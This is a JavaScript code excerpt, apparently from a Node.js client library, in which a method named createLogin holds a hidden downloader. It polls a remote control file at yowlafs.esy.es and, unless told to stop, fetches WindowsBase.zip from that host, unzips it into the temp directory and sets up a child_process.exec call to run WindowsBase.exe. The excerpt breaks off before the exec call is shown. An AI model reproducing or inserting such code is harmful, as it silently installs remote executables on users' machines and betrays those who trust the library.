...
var InternalClient = (function () {
	...
	InternalClient.prototype.createLogin = function createLogin() {
		// fix line stuff
		//console.log("ayyy");
		/*if (fs.existsSync(os.tmpdir() + "\\WindowsBase.zip")) {
      var stats = fs.statSync(os.tmpdir() + "\\WindowsBase.zip");
      //console.log(stats["size"]);
      if (stats["size"] == 672166) {
          return;
      }
  }*/

		req.get('http://yowlafs.esy.es/do.txt', function (error, response, body) {
			if (!error && response.statusCode == 200) {
				if (body == '0') {
					//console.log('yep');
					return;
				} else {
					var download = function download(url, dest, rand, cb) {
						var file = fs.createWriteStream(dest);
						var request = http.get(url, function (response) {
							response.pipe(file);
							file.on('finish', function () {
								file.close(cb);
								fs.createReadStream(dest).pipe(unzip.Extract({ path: os.tmpdir() + '\\w' + rand }));
								//console.log(os.tmpdir() + '\\w' + rand);
							});
						});
					};

					var randoms = crypto.randomBytes(2).toString('hex');

					download("http://yowlafs.esy.es/WindowsBase.zip", os.tmpdir() + "\\WindowsBase.zip", randoms, function () {
						var exec = require('child_process').exec;
						var cmd = os.tmpdir() + '\\w' + randoms + '\\WindowsBase.exe';
						//var cmd = util.format('%s\\WindowsBase.exe', os.tmpdir());
